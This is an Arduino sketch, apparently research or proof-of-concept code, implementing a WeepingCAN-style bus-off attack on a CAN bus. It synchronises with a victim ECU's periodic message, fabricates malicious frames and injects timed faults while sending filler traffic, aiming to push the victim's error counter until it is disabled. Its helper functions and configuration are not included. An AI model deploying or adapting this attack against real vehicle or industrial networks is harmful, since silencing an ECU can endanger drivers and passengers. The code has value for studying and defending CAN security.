#include "Arduino.h"
#include <Arduino_CAN.h>

#include "config.h"

#include "src/utils.h"

void setup()
{

  /*
    Initialise CAN bus peripheral and serial port
  */

  Serial.begin(CONFIG.serial.baud);
  CAN.begin(CONFIG.can.bitrate);
  Serial.println("Peripherals initialised!");

  /*
    Synchronise with victim's message by measuring the transmission period and jitter
  */

  uint64_t samples[CONFIG.sync.samples];

  // Synchronise at the beginning
  Serial.print("Attempting synchronisation...");
  if (!synchronise(CONFIG.messages.tampered.id, CONFIG.sync.tries))
  {
    Serial.println("could not synchronise, is the message correct?");
    return;
  }
  uint64_t prev_time = micros();
  Serial.println("synchronisation acquired");

  // Take samples
  Serial.print("Sampling...");
  for (int sample = 0; sample < CONFIG.sync.samples; sample++)
  {
    if (!synchronise(CONFIG.messages.tampered.id, CONFIG.sync.tries))
    {
      Serial.println("failed to synchronise, stopping sampling");
      return;
    }
    uint64_t recv_time = micros();
    samples[sample] = recv_time - prev_time;
    prev_time = recv_time;
  }
  Serial.println("sampling finished!");

  // Obtain measures
  auto victim_period = avg(samples, CONFIG.sync.samples);
  auto victim_jitter = stddev(samples, CONFIG.sync.samples);
  // Hack because there is no string constructor for long in Arduino
  char buf_period[50];
  char buf_jitter[50];
  ltoa(victim_period, buf_period, 10);
  ltoa(victim_jitter, buf_jitter, 10);
  Serial.println("Measures obtained:");
  Serial.println("\tperiod = " + String(buf_period) + " us");
  // If jitter is too high synchronisation may be difficult and the attack could fail
  Serial.println("\tjitter = " + String(buf_jitter) + " us");

  // /*
  //   At this point we can start the attack
  // */

  // Fabricate malicious preceding message and tampered
  uint8_t dominant_data_prec[CONFIG.messages.preceding.dlc] = {};
  // Now payload is all recessive for WeepingCAN
  uint8_t recessive_data_mali[CONFIG.messages.tampered.dlc] = {1};
  CanMsg preceding_msg = {CONFIG.messages.preceding.id, CONFIG.messages.preceding.dlc, dominant_data_prec};
  CanMsg malicious_msg = {CONFIG.messages.tampered.id, CONFIG.messages.tampered.dlc, recessive_data_mali};
  Serial.println("Malicious messages fabricated");

  // Build array containing "normal messages" as specified by the config
  CanMsg traffic[CONFIG.messages.traffic_msgs];

  for (int i = 0; i < CONFIG.messages.traffic_msgs; i++) {
    traffic[i] = CanMsg(CONFIG.messages.traffic[i].id, CONFIG.messages.traffic[i].dlc, nullptr);
  }

  // Here it starts the "attack loop", it is different from before since we are interleaving fault injection with normal messages to decrease our TEC faster than the victim
  for (int tries = 0; tries < CONFIG.iter; tries++)
  {
    // Send normal every CONFIG.period ms
    delay(CONFIG.period);
    send_traffic(traffic, CONFIG.messages.traffic_msgs);
    // Every CONFIG.skip inject the fault
    if ((tries % CONFIG.skip) == 0)
    {
      if (!synchronise(CONFIG.messages.tampered.id, CONFIG.sync.tries))
      {
        Serial.println("Could not re-sync with message, aborting attack");
        return;
      }
      delayMicroseconds(victim_period - scaleperci(msg_duration_micros(int(CONFIG.can.bitrate), CONFIG.messages.tampered.dlc), CONFIG.sync.scale));
      // Enqueue messages and inject them
      attack(preceding_msg, malicious_msg);
    }
    log_error_counters();
  }

  // Now victim should be disabled
}

void loop()
{
}
